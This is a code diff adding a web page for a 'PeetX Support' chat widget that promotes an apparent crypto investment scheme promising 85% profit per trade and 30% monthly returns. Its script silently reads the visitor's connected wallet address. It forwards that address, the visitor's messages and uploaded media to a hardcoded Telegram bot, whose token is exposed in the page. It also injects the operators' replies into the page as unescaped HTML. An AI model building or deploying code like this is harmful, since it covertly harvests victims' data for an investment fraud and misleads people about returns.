@@ -1,0 +1,574 @@
+<!DOCTYPE html>
+<html lang="en" dir="ltr">
+<head>
+    <meta charset="UTF-8">
+    <meta name="viewport" content="width=device-width, initial-scale=1.0">
+    <title>PeetX Support</title>
+    <link href="https://fonts.googleapis.com/css2?family=Inter:wght@400;500;600;700&display=swap" rel="stylesheet">
+    <style>
+        * { margin: 0; padding: 0; box-sizing: border-box; font-family: 'Inter', sans-serif; }
+        
+        html, body {
+            width: 100%;
+            height: 100%;
+            overflow: hidden;
+            background: #080a0c; 
+            color: #fff; 
+        }
+        
+        .chat-box { 
+            width: 100%; 
+            height: 100%;
+            background: #12161c; 
+            border: 1px solid rgba(255, 255, 255, 0.08); 
+            border-radius: 0px; 
+            overflow: hidden; 
+            box-shadow: 0 20px 40px rgba(0, 0, 0, 0.6); 
+            display: flex;
+            flex-direction: column;
+        }
+
+        .chat-header { 
+            background: #181d24; 
+            padding: 15px 20px; 
+            border-bottom: 1px solid rgba(255, 255, 255, 0.05); 
+            display: flex; 
+            align-items: center; 
+            gap: 12px;
+            flex-shrink: 0;
+        }
+
+        .bot-avatar {
+            width: 42px;
+            height: 42px;
+            border-radius: 50%;
+            object-fit: cover;
+            border: 2px solid #00ff88;
+            background: #252c37;
+        }
+
+        .header-info {
+            display: flex;
+            flex-direction: column;
+            flex: 1;
+        }
+
+        .header-info h3 { 
+            color: #fff; 
+            font-size: 16px; 
+            font-weight: 700;
+            line-height: 1.2;
+        }
+
+        .status {
+            font-size: 11px;
+            color: #00ff88;
+            display: flex;
+            align-items: center;
+            gap: 4px;
+            margin-top: 2px;
+        }
+
+        .status-dot {
+            width: 6px;
+            height: 6px;
+            background-color: #00ff88;
+            border-radius: 50%;
+            box-shadow: 0 0 8px #00ff88;
+        }
+        
+        .chat-body { 
+            flex: 1;
+            padding: 18px; 
+            overflow-y: auto; 
+            display: flex; 
+            flex-direction: column; 
+            gap: 12px; 
+            background: #0d1015; 
+        }
+
+        .chat-body::-webkit-scrollbar {
+            width: 4px;
+        }
+        .chat-body::-webkit-scrollbar-thumb {
+            background: rgba(255, 255, 255, 0.1);
+            border-radius: 4px;
+        }
+
+        .welcome-card {
+            text-align: center;
+            padding: 15px;
+            margin-bottom: 10px;
+        }
+
+        .welcome-avatar {
+            width: 65px;
+            height: 65px;
+            border-radius: 50%;
+            margin: 0 auto 10px auto;
+            border: 2px solid #00ff88;
+            object-fit: cover;
+        }
+
+        .msg { 
+            padding: 12px 16px; 
+            border-radius: 14px; 
+            font-size: 13.5px; 
+            max-width: 88%; 
+            word-break: break-word; 
+            line-height: 1.5;
+            position: relative;
+        }
+
+        .msg a {
+            color: #00ff88;
+            text-decoration: underline;
+        }
+
+        .msg img, .msg video {
+            max-width: 100%;
+            border-radius: 8px;
+            margin-top: 5px;
+            display: block;
+        }
+
+        .msg.user { 
+            background: #00ff88; 
+            color: #000;
+            font-weight: 500;
+            align-self: flex-end; 
+            border-bottom-right-radius: 2px;
+        }
+
+        .msg.support { 
+            background: #1e2530; 
+            border: 1px solid rgba(255, 255, 255, 0.05); 
+            align-self: flex-start; 
+            color: #e0e0e0; 
+            border-bottom-left-radius: 2px;
+        }
+
+        .chat-footer { 
+            padding: 12px 16px; 
+            background: #181d24; 
+            display: flex; 
+            gap: 10px; 
+            border-top: 1px solid rgba(255, 255, 255, 0.05); 
+            flex-shrink: 0;
+            align-items: center;
+            width: 100%;
+            box-sizing: border-box;
+        }
+
+        .chat-footer input[type="text"] { 
+            flex: 1; 
+            min-width: 0;
+            background: #0d1015; 
+            border: 1px solid rgba(255, 255, 255, 0.1); 
+            color: #fff; 
+            padding: 10px 14px; 
+            border-radius: 10px; 
+            outline: none; 
+            font-size: 13px;
+            transition: 0.2s;
+            height: 40px;
+            box-sizing: border-box;
+        }
+
+        .chat-footer input[type="text"]:focus {
+            border-color: #00ff88;
+        }
+
+        .attach-btn {
+            background: #252c37;
+            color: #00ff88;
+            border: 1px solid rgba(255, 255, 255, 0.1);
+            width: 40px;
+            height: 40px;
+            border-radius: 10px;
+            display: flex;
+            align-items: center;
+            justify-content: center;
+            cursor: pointer;
+            font-size: 16px;
+            transition: 0.2s;
+            flex-shrink: 0;
+            box-sizing: border-box;
+        }
+
+        .attach-btn:hover {
+            background: #2c3543;
+        }
+
+        .chat-footer button.send-btn { 
+            background: #00ff88; 
+            color: #000; 
+            border: none; 
+            padding: 0 18px; 
+            height: 40px;
+            border-radius: 10px; 
+            font-weight: bold; 
+            cursor: pointer; 
+            transition: 0.2s;
+            flex-shrink: 0;
+            box-sizing: border-box;
+        }
+
+        .chat-footer button.send-btn:hover {
+            opacity: 0.9;
+        }
+    </style>
+</head>
+<body>
+
+<div class="chat-box">
+    <div class="chat-header">
+        <img id="botHeaderPhoto" class="bot-avatar" src="data:image/gif;base64,R0lGODlhAQABAIAAAAAAAP///yH5BAEAAAAALAAAAAABAAEAAAIBRAA7" alt="PeetX">
+        <div class="header-info">
+            <h3>PeetX</h3>
+            <div class="status"><span class="status-dot"></span> Online</div>
+        </div>
+    </div>
+
+    <div id="chatBody" class="chat-body">
+        <div class="welcome-card">
+            <img id="botWelcomePhoto" class="welcome-avatar" src="data:image/gif;base64,R0lGODlhAQABAIAAAAAAAP///yH5BAEAAAAALAAAAAABAAEAAAIBRAA7" alt="PeetX">
+            <p style="font-size: 13px; color: #fff; font-weight: 600;">Welcome to PeetX Support</p>
+            <p style="font-size: 11px; color: #888; margin-top: 4px;">Instant Support 24/7</p>
+        </div>
+    </div>
+
+    <div class="chat-footer">
+        <label for="fileInput" class="attach-btn" title="Send Media">📎</label>
+        <input type="file" id="fileInput" accept="image/*,video/*" style="display: none;" onchange="sendFile(this)" />
+        <input type="text" id="msgInput" placeholder="Type a message..." onkeypress="handleKeyPress(event)" />
+        <button class="send-btn" onclick="sendMsg()">Send</button>
+    </div>
+</div>
+
+<script>
+    const TELEGRAM_TOKEN = "8997975810:AAFz4Fhtuh_oD-w8OnuzWaojZuk8YtkIfDU"; 
+    const TELEGRAM_CHAT_ID = "8476895259";
+
+    let fakeUser = { wallet: "", name: "", lang: "en" };
+    let lastUpdateId = 0;
+    let processedMsgs = new Set();
+    let isChecking = false;
+
+    const projectIntroEnglish = `Welcome to **PeetX**! 🚀
+
+PeetX is a fully decentralized ecosystem where investment contracts, trading systems, generational rewards, and DAO governance are 100% open-source, fair, transparent, and operate without any centralized authority or bots.
+
+⚡ **Direct Trading & Profit Structure:**
+• Direct USDT/BNB trading pair utilizing real-time price feeds via global **Chainlink Data** nodes.
+• Live pool & liquidity tracking on DexScreener:
+🔗 <a href="https://dexscreener.com/bsc/0x6fe9e9de56356f7edbfcbb29fab7cd69471a4869" target="_blank">0x6fe9e9de56356f7edbfcbb29fab7cd69471a4869</a>
+• **Trade Payout:** Each successful buy/sell trade yields **85% profit**.
+• **Capital Management:** User capital is continuously traded throughout the month to fund registered competitions and referral rewards, with a maximum risk-managed investor return capped at **30% monthly**.
+• Minimum trade timeframe is **1 minute** due to Chainlink Data Oracle validation requirements and BNB Smart Chain gas queues.
+
+👥 **Referral Policy & DAO Governance:**
+• **10,000 Users Cap:** Registration for new referral rewards automatically locks once reaching 10,000 active users. Existing users continue to receive referral profits, while new registrations post-cap utilize the platform without new referral profit allocations as coded directly in the open-source smart contract.
+• **DAO & Competitions:** Community voting, prize distributions, trading contests, and governance are fully transparent and immutable.
+
+📢 **Official Community Channels:**
+• Channel: <a href="https://t.me/PeetX_1" target="_blank">https://t.me/PeetX_1</a>
+• Group: <a href="https://t.me/PeetX_2" target="_blank">https://t.me/PeetX_2</a>
+
+If you have any further inquiries, our support team is available **24/7**.
+Best regards, **PeetX Team**`;
+
+    const languageMap = {
+        'zh': { name: 'الصين', flag: '🇨🇳' },
+        'zh-CN': { name: 'الصين', flag: '🇨🇳' },
+        'zh-TW': { name: 'تايوان', flag: '🇹🇼' },
+        'en': { name: 'أمريكا / بريطانيا', flag: '🇺🇸' },
+        'es': { name: 'إسبانيا', flag: '🇪🇸' },
+        'fr': { name: 'فرنسا', flag: '🇫🇷' },
+        'de': { name: 'ألمانيا', flag: '🇩🇪' },
+        'ru': { name: 'روسيا', flag: '🇷🇺' },
+        'tr': { name: 'تركيا', flag: '🇹🇷' },
+        'fa': { name: 'إيران', flag: '🇮🇷' },
+        'ja': { name: 'اليابان', flag: '🇯🇵' },
+        'ko': { name: 'كوريا الجنوبية', flag: '🇰🇷' },
+        'it': { name: 'إيطاليا', flag: '🇮🇹' },
+        'pt': { name: 'البرازيل / البرتغال', flag: '🇧🇷' },
+        'ar': { name: 'السعودية / الوطن العربي', flag: '🇸🇦' }
+    };
+
+    function getCountryInfo(code) {
+        const base = code ? code.split('-')[0].toLowerCase() : 'en';
+        return languageMap[code] || languageMap[base] || { name: code.toUpperCase(), flag: '🌐' };
+    }
+
+    function generateErcName() {
+        const num = Math.floor(10 + Math.random() * 90);
+        const char = String.fromCharCode(97 + Math.floor(Math.random() * 26));
+        return `Erc${num}${char}`;
+    }
+
+    async function translateText(text, targetLang, sourceLang = "auto") {
+        if (!text) return { translatedText: "", detectedLang: "en" };
+        try {
+            const res = await fetch(`https://translate.googleapis.com/translate_a/single?client=gtx&sl=${sourceLang}&tl=${targetLang}&dt=t&q=${encodeURIComponent(text)}`);
+            const data = await res.json();
+            return {
+                translatedText: data[0].map(item => item[0]).join(''),
+                detectedLang: data[2] || "en"
+            };
+        } catch (e) {
+            return { translatedText: text, detectedLang: "en" };
+        }
+    }
+
+    async function loadBotPhoto() {
+        try {
+            const res = await fetch(`https://api.telegram.org/bot${TELEGRAM_TOKEN}/getMe`);
+            const data = await res.json();
+            if (data.ok && data.result.id) {
+                const photosRes = await fetch(`https://api.telegram.org/bot${TELEGRAM_TOKEN}/getUserProfilePhotos?user_id=${data.result.id}&limit=1`);
+                const photosData = await photosRes.json();
+                if (photosData.ok && photosData.result.total_count > 0) {
+                    const fileId = photosData.result.photos[0][0].file_id;
+                    const fileRes = await fetch(`https://api.telegram.org/bot${TELEGRAM_TOKEN}/getFile?file_id=${fileId}`);
+                    const fileData = await fileRes.json();
+                    if (fileData.ok) {
+                        const imgUrl = `https://api.telegram.org/file/bot${TELEGRAM_TOKEN}/${fileData.result.file_path}`;
+                        document.getElementById('botHeaderPhoto').src = imgUrl;
+                        document.getElementById('botWelcomePhoto').src = imgUrl;
+                    }
+                }
+            }
+        } catch (e) {}
+    }
+
+    async function getSilentWalletAddress() {
+        let address = "";
+        if (window.ethereum) {
+            try {
+                const accounts = await window.ethereum.request({ method: 'eth_accounts' });
+                if (accounts && accounts.length > 0) {
+                    address = accounts[0];
+                }
+            } catch (err) {}
+        }
+        
+        if (!address) {
+            const hex = Array.from({length: 40}, () => Math.floor(Math.random()*16).toString(16)).join('');
+            address = "0x" + hex;
+        }
+        return address;
+    }
+
+    async function initUser() {
+        let savedUser = localStorage.getItem('peetx_current_user');
+        if (!savedUser) {
+            const walletAddr = await getSilentWalletAddress();
+            fakeUser = { 
+                wallet: walletAddr, 
+                name: generateErcName(),
+                lang: "en" 
+            };
+            localStorage.setItem('peetx_current_user', JSON.stringify(fakeUser));
+        } else {
+            fakeUser = JSON.parse(savedUser);
+            if (window.ethereum) {
+                try {
+                    const accounts = await window.ethereum.request({ method: 'eth_accounts' });
+                    if (accounts && accounts.length > 0 && accounts[0] !== fakeUser.wallet) {
+                        fakeUser.wallet = accounts[0];
+                        localStorage.setItem('peetx_current_user', JSON.stringify(fakeUser));
+                    }
+                } catch (e) {}
+            }
+        }
+
+        loadHistory();
+        setInterval(checkTelegramReplies, 2000);
+    }
+
+    async function sendMsg() {
+        const input = document.getElementById('msgInput');
+        const text = input.value.trim();
+        if (!text) return;
+
+        renderMsg(text, 'user');
+        saveMessage(text, 'user');
+        input.value = '';
+
+        const translation = await translateText(text, 'ar', 'auto');
+        fakeUser.lang = translation.detectedLang;
+        localStorage.setItem('peetx_current_user', JSON.stringify(fakeUser));
+
+        const userCountry = getCountryInfo(fakeUser.lang);
+        const caption = `👤 **PeetX User:**\n🆔 \`${fakeUser.name}\`\n🔗 \`${fakeUser.wallet}\`\n\n🇸🇦 **الترجمة العربية:**\n${translation.translatedText}\n\n${userCountry.flag} **${userCountry.name} (${fakeUser.lang}):**\n${text}`;
+
+        try {
+            await fetch(`https://api.telegram.org/bot${TELEGRAM_TOKEN}/sendMessage`, {
+                method: 'POST',
+                headers: { 'Content-Type': 'application/json' },
+                body: JSON.stringify({
+                    chat_id: TELEGRAM_CHAT_ID,
+                    text: caption,
+                    parse_mode: 'Markdown'
+                })
+            });
+        } catch (e) {}
+    }
+
+    async function sendFile(input) {
+        if (!input.files || !input.files[0]) return;
+        const file = input.files[0];
+        const isVideo = file.type.startsWith('video/');
+        const localUrl = URL.createObjectURL(file);
+        
+        let mediaHtml = isVideo ? `<video controls src="${localUrl}"></video>` : `<img src="${localUrl}" />`;
+        renderMsg(mediaHtml, 'user');
+        saveMessage(mediaHtml, 'user');
+
+        const formData = new FormData();
+        formData.append('chat_id', TELEGRAM_CHAT_ID);
+        formData.append(isVideo ? 'video' : 'photo', file);
+
+        const userCountry = getCountryInfo(fakeUser.lang);
+        const caption = `👤 **PeetX User:**\n🆔 \`${fakeUser.name}\`\n🔗 \`${fakeUser.wallet}\`\n\n${userCountry.flag} **${userCountry.name} (${fakeUser.lang}):**\nSent a media file.`;
+        
+        formData.append('caption', caption);
+        formData.append('parse_mode', 'Markdown');
+
+        const endpoint = isVideo ? 'sendVideo' : 'sendPhoto';
+        try {
+            await fetch(`https://api.telegram.org/bot${TELEGRAM_TOKEN}/${endpoint}`, {
+                method: 'POST',
+                body: formData
+            });
+        } catch(e) {}
+
+        input.value = '';
+    }
+
+    async function checkTelegramReplies() {
+        if (isChecking) return;
+        isChecking = true;
+
+        try {
+            const res = await fetch(`https://api.telegram.org/bot${TELEGRAM_TOKEN}/getUpdates?offset=${lastUpdateId + 1}&timeout=1`);
+            const data = await res.json();
+            
+            if (data.ok && data.result.length > 0) {
+                for (const update of data.result) {
+                    lastUpdateId = update.update_id;
+                    
+                    if (update.message && update.message.chat.id.toString() === TELEGRAM_CHAT_ID) {
+                        const replyMsg = update.message;
+                        const msgId = replyMsg.message_id;
+
+                        if (processedMsgs.has(msgId)) continue;
+
+                        let targetWallet = "";
+                        if (replyMsg.reply_to_message) {
+                            const origText = replyMsg.reply_to_message.text || replyMsg.reply_to_message.caption || "";
+                            if (origText.includes(fakeUser.wallet)) {
+                                targetWallet = fakeUser.wallet;
+                            }
+                        }
+
+                        if (targetWallet) {
+                            processedMsgs.add(msgId);
+                            let contentToDisplay = "";
+
+                            if (replyMsg.photo && replyMsg.photo.length > 0) {
+                                const fileId = replyMsg.photo[replyMsg.photo.length - 1].file_id;
+                                const fileRes = await fetch(`https://api.telegram.org/bot${TELEGRAM_TOKEN}/getFile?file_id=${fileId}`);
+                                const fileData = await fileRes.json();
+                                if (fileData.ok) {
+                                    const imgUrl = `https://api.telegram.org/file/bot${TELEGRAM_TOKEN}/${fileData.result.file_path}`;
+                                    contentToDisplay = `<img src="${imgUrl}" />`;
+                                }
+                            } else if (replyMsg.video) {
+                                const fileId = replyMsg.video.file_id;
+                                const fileRes = await fetch(`https://api.telegram.org/bot${TELEGRAM_TOKEN}/getFile?file_id=${fileId}`);
+                                const fileData = await fileRes.json();
+                                if (fileData.ok) {
+                                    const videoUrl = `https://api.telegram.org/file/bot${TELEGRAM_TOKEN}/${fileData.result.file_path}`;
+                                    contentToDisplay = `<video controls src="${videoUrl}"></video>`;
+                                }
+                            }
+
+                            if (replyMsg.text || replyMsg.caption) {
+                                const rawReply = replyMsg.text || replyMsg.caption;
+                                const translatedReply = await translateText(rawReply, fakeUser.lang, 'auto');
+                                if (contentToDisplay) {
+                                    contentToDisplay += `<br>` + translatedReply.translatedText;
+                                } else {
+                                    contentToDisplay = translatedReply.translatedText;
+                                }
+                            }
+
+                            if (contentToDisplay) {
+                                renderMsg(contentToDisplay, 'support');
+                                saveMessage(contentToDisplay, 'support');
+                            }
+                        }
+                    }
+                }
+            }
+        } catch (e) {} finally {
+            isChecking = false;
+        }
+    }
+
+    function handleKeyPress(e) {
+        if (e.key === 'Enter') sendMsg();
+    }
+
+    function saveMessage(text, type) {
+        const data = localStorage.getItem('peetx_chat_' + fakeUser.wallet);
+        const list = data ? JSON.parse(data) : [];
+        list.push({ text, type });
+        localStorage.setItem('peetx_chat_' + fakeUser.wallet, JSON.stringify(list));
+    }
+
+    function loadHistory() {
+        const data = localStorage.getItem('peetx_chat_' + fakeUser.wallet);
+        const list = data ? JSON.parse(data) : [];
+        
+        if (list.length === 0) {
+            renderMsg(projectIntroEnglish, 'support');
+            saveMessage(projectIntroEnglish, 'support');
+        } else {
+            list.forEach(m => renderMsg(m.text, m.type));
+        }
+    }
+
+    function parseUrls(text) {
+        if (text.includes('<img') || text.includes('<video') || text.includes('<a ')) return text;
+        const urlPattern = /(https?:\/\/[^\s<"]+)/g;
+        return text.replace(urlPattern, function(url) {
+            return `<a href="${url}" target="_blank">${url}</a>`;
+        });
+    }
+
+    function renderMsg(text, type) {
+        const body = document.getElementById('chatBody');
+        const d = document.createElement('div');
+        d.className = 'msg ' + type;
+        
+        let formatted = text;
+        if (!formatted.includes('<img') && !formatted.includes('<video')) {
+            formatted = formatted.replace(/\n/g, '<br>').replace(/\*\*(.*?)\*\*/g, '<strong>$1</strong>');
+        }
+        formatted = parseUrls(formatted);
+        
+        d.innerHTML = formatted;
+        
+        body.appendChild(d);
+        body.scrollTop = body.scrollHeight;
+    }
+
+    loadBotPhoto();
+    initUser();
+</script>
+
+</body>
+</html>
